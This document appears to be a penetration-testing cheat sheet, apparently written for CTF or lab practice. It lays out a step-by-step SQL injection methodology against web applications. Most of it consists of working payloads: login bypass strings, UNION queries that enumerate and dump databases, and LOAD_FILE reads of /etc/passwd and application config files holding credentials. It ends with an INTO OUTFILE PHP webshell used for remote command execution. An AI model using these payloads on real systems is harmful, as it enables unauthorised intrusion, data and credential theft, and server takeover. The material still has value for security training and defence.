# SQL Injection Methodology

**Core principle:** Simple → Complex. Exhaust simple options before advancing. Test EVERY input field, not just the obvious ones.

---

## Step 1 — Map ALL Input Fields

Before testing anything, find every field that touches the database:
- Login forms (username, password)
- Registration forms (all fields — including invitation codes, referral codes)
- Search bars
- Profile/settings fields
- URL parameters (`?id=1`, `?page=home`, `?search=term`)
- Hidden POST fields

**Don't fixate on the obvious field. The injection point is often NOT the login.**

---

## Step 2 — Probe Each Field with a Single Quote

Test every field with `'` and observe the response:

| Response | Meaning |
|----------|---------|
| `500 Internal Server Error` | SQL syntax error → **injectable** |
| Different page behavior / error message | Possibly injectable |
| `302` redirect with "wrong/invalid" message | Query ran fine, wrong value — NOT injectable here |
| No change | Likely parameterized |

**If unsure, confirm with SLEEP:**
```
' OR SLEEP(5)-- -
```
- Response takes 5+ seconds → confirmed injectable
- Response is fast (~0.4s) → parameterized, move on

---

## Step 3 — Auth Bypass (Simple to Complex)

Try these in order, stop when one works:

```sql
-- 1. Comment out the password check (simplest)
admin'-- -
admin' #

-- 2. Comment with parenthesis close (if query uses parens)
admin')-- -

-- 3. OR bypass — no comment needed (uses original closing quote)
' OR '1'='1
admin' OR '1'='1

-- 4. OR bypass with comment
' OR 1=1-- -
admin' OR 1=1-- -

-- 5. OR in both fields
username: anything
password: ' OR '1'='1

-- 6. Target specific user by ID
' OR id=1)-- -
```

**For non-login fields (invitation codes, access codes):**
- Some fields validate format BEFORE SQL — prefix injection with valid-looking data:
```
xxxx-xxxx-1111' OR '1'='1
```
- The `' OR '1'='1` pattern (no comment) is often more reliable than `-- -` on these fields

---

## Step 4 — UNION Injection

Only attempt after confirming the field is injectable AND output is reflected on the page.

### 4a. Count columns (ORDER BY method)
```sql
' ORDER BY 1-- -    → works
' ORDER BY 2-- -    → works
' ORDER BY 3-- -    → error = 2 columns
```

### 4b. Find visible columns
```sql
' UNION SELECT 1,2,3-- -
-- Look at page output — which numbers appear?
```

### 4c. Enumerate DB
```sql
-- Current database
' UNION SELECT 1,database(),3-- -

-- All databases
' UNION SELECT 1,schema_name,3 FROM INFORMATION_SCHEMA.SCHEMATA-- -

-- Tables in target DB
' UNION SELECT 1,TABLE_NAME,3 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dbname'-- -

-- Columns in target table
' UNION SELECT 1,COLUMN_NAME,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'-- -

-- Dump data
' UNION SELECT 1,column1,3 FROM dbname.tablename-- -
' UNION SELECT 1,column1,3 FROM dbname.tablename WHERE col='value'-- -
```

---

## Step 5 — File Read

### Check privileges
```sql
' UNION SELECT 1,user(),3-- -
' UNION SELECT 1,privilege_type,3 FROM information_schema.user_privileges WHERE grantee="'user'@'host'"-- -
' UNION SELECT 1,variable_value,3 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
-- Empty value = read/write anywhere. NULL = blocked.
```

### Read files
```sql
' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3-- -

-- Find web root via server config:
' UNION SELECT 1,LOAD_FILE("/etc/nginx/sites-enabled/default"),3-- -
' UNION SELECT 1,LOAD_FILE("/etc/apache2/apache2.conf"),3-- -

-- Read app source for DB credentials:
' UNION SELECT 1,LOAD_FILE("/var/www/html/config.php"),3-- -
```

---

## Step 6 — File Write / RCE

```sql
-- Write webshell
' UNION SELECT "","<?php system($_REQUEST[0]); ?>","" INTO OUTFILE '/var/www/html/shell.php'-- -

-- Execute commands
http://<TARGET>/shell.php?0=id
http://<TARGET>/shell.php?0=find / -name "flag_*" 2>/dev/null
http://<TARGET>/shell.php?0=cat /path/to/flag.txt
```

---

## Decision Flow

```
For EVERY input field:
  └─ Inject ' → 500 or behavior change?
       ├─ No  → Confirm with SLEEP → still no? → parameterized, SKIP
       └─ Yes → Try auth bypass payloads (simple to complex)
                └─ Bypass works? → Explore app, find more injection points
                └─ Need data extraction? → Count columns → UNION inject
                     └─ Have FILE privilege? → LOAD_FILE → find web root
                          └─ secure_file_priv empty? → write shell → RCE
```

---

## Burp Repeater Tips

- Use Repeater to edit POST body directly — avoids URL-encoding mistakes from browser forms
- Watch full response body, not just status code
- Test one payload at a time, note what changes
- If a field validates format (e.g. `xxxx-xxxx-xxxx`), keep that format and inject AFTER it

---

## Common Pitfalls

| Pitfall | Fix |
|---------|-----|
| Stuck on login, ignoring other fields | Test ALL fields first |
| OR 1=1 gives 500 | Table may be empty OR a second query re-uses injected input — try `' OR '1'='1` without comment |
| UNION gives 500 | Wrong column count — use ORDER BY to count first |
| `-- -` comment not working | Try `#` or use `' OR '1'='1` (no comment needed) |
| Injection payload URL-encoded by browser | Use Burp Repeater to edit raw POST body |
| Valid-format field rejecting payloads | Prefix with valid-format string before injecting |
